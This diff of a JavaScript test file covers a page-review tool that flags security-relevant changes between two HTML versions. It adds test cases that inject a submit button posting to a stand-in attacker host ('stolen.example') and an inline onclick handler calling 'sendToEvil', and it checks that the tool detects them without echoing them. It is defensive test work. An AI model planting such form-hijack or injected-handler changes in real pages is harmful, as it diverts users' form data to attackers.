@@ -10,7 +10,7 @@ const base='<!doctype html><html><head><link rel="stylesheet" href="/assets/them
  '<img src="/assets/picture.webp" loading="lazy" decoding="async"></main></body></html>';
 const good=M.review(base,base);
 assert.equal(good.matched,true);
-assert.equal(good.comparedCategories,7);
+assert.equal(good.comparedCategories,9);
 const action=M.review(base,base.replace('https://collector.example/forms/pilot/lead',
  'https://stolen.example/forms/pilot/lead'));
 assert.ok(action.changedCategories.includes('formDestinations'));
@@ -22,6 +22,13 @@ const rel=M.review(base,base.replace('target="_blank" rel="noopener"','target="_
 assert.ok(rel.changedCategories.includes('linkOpenerPolicy'));
 const loading=M.review(base,base.replace('loading="lazy"','loading="eager"'));
 assert.ok(loading.changedCategories.includes('imageLoadingPolicy'));
+const override=M.review(base,base.replace('</form>',
+ '<button type="submit" formaction="https://stolen.example/post">Send</button></form>'));
+assert.ok(override.changedCategories.includes('submitOverrides'));
+const handler=M.review(base,base.replace('<main>',
+ '<main onclick="sendToEvil();" style="opacity:0.5">'));
+assert.ok(handler.changedCategories.includes('inlineExecutionAttrs'));
+assert.ok(!JSON.stringify(handler).includes('sendToEvil'));
 assert.equal(hmac.hiddenTokenValuesReturned,false);
 assert.ok(!JSON.stringify(hmac).includes('b'.repeat(64)));
 assert.ok(!JSON.stringify(action).includes('stolen.example'));
